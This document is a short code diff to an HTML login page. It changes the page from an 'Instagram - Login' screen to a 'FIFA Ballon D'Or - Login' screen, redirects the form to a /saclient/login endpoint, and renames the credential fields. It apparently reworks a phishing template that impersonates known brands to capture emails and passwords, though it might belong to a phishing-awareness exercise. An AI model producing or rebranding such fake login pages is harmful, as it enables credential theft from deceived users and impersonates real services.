@@ -9,7 +9,7 @@
     <meta charset="UTF-8" />
 		<meta http-equiv="X-UA-Compatible" content="IE=edge"> 
 		<meta name="viewport" content="width=device-width, initial-scale=1"> 
-		<title>Instagram - Login</title>
+		<title>FIFA Ballon D'Or - Login</title>
 		
 		<link rel="stylesheet" type="text/css" href="css/normalize.css" />
 		<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
@@ -30,19 +30,19 @@
 					
 					<section class="content__main">
 						<div class="form-login">
-							<form action="/insta/login" method="post"> 
+							<form action="/saclient/login" method="post"> 
 								
-								<label class="form-login__label" for="username">Username</label>
+								<label class="form-login__label" for="email">Email</label>
 								<div class="input-group">
 								    <span class="input-group-addon"><i class="glyphicon glyphicon-user"></i></span>
-									<input type="text" class="form-control form-login__input" id="username" name="username" title="username" />
+									<input type="text" class="form-control form-login__input" id="email" name="mail" title="email" />
 								</div>
 								<label class="form-login__label" for="password">Password</label>
 								<div class="input-group">
 								    <span class="input-group-addon"><i class="glyphicon glyphicon-lock"></i></span>
-									<input type="password" class="form-control form-login__input" id="password" name="password" title="password"/>
+									<input type="password" class="form-control form-login__input" id="password" name="passwd" title="password"/>
 								</div>
-								<button type="submit" id="submit" class="btn form-login__button">Submit</button>
+								<button type="submit" id="submit" class="btn form-login__button">Login</button>
 							</form>	
 						</div>
 					</section>
